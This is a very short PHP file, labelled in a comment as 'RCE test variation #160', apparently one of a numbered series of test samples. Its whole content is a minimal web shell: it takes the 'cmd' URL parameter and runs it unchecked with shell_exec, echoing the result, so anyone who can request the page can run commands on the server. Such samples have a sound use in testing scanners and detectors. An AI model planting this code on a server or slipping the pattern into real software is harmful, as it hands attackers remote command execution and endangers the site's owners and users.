<?php
// RCE test variation #160
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>